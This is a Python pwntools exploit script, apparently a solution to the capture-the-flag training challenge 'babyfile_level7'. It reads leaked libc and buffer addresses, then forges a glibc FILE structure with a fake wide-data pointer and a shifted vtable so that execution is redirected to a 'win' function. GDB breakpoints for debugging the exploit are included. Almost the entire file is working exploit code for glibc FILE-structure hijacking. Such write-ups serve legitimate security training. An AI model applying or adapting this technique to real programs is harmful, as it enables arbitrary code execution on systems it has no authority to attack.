#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level7_patched"
else:
    binary = "/challenge/babyfile_level7"

context.log_level = 'info'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
b *main
b *fwrite
b *fwrite+189   
c
c
b *_IO_wdoallocbuf+36
p fp
p *(struct _IO_FILE_plus *) $1
p *(FILE *)$1
p $3->_wide_data
p *$4
p $5->_wide_vtable+0x68
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)


io = start()
rcu(b'[LEAK] The address of puts() within libc is: ')
libc.address = int(io.recvline().strip(), 16) - libc.sym['puts']
rcu(b'[LEAK] The name buffer is located at: ')
buffer = int(io.recvline().strip(), 16)
win = elf.sym['win']
success(f"libc base @ {hex(libc.address)}")
success(f"buffer @ {hex(buffer)}")
if user == 'broder':
    fake_vtable = libc.sym['_IO_wfile_jumps_maybe_mmap'] + 160
else:
    fake_vtable = libc.address + 0x1e8de0
success(f"fake_vtable @ {hex(fake_vtable)}")
_wide_data = buffer - 224
# fs = p(0xfbad2484)
# fs += p(0) * 12
# fs += p(libc.sym['_IO_2_1_stderr_'])
# fs += p32(3) + p8(0) * 20
# fs += p(buffer + 496)
# fs += p(0xffffffffffffffff)
# fs += p(0)
# fs += p(_wide_data)
# fs += p(0) * 4
# fs += p8(0) * 16
# fs += p(fake_vtable)
fs = FileStructure()
# fs.flags = 0xfbad2484
# fs.fileno = 3
# fs.chain = libc.sym['_IO_2_1_stderr_']
fs._lock = buffer + 496
fs._wide_data = _wide_data
fs.vtable = fake_vtable
print(len(fs))
name = p(buffer - 0x68 + 8) + p(win)
rcu(b'Please enter your name.\n')
s(name)
rcu(b'Now reading from stdin directly to the FILE struct.\n\n')
s(bytes(fs))
io.interactive()
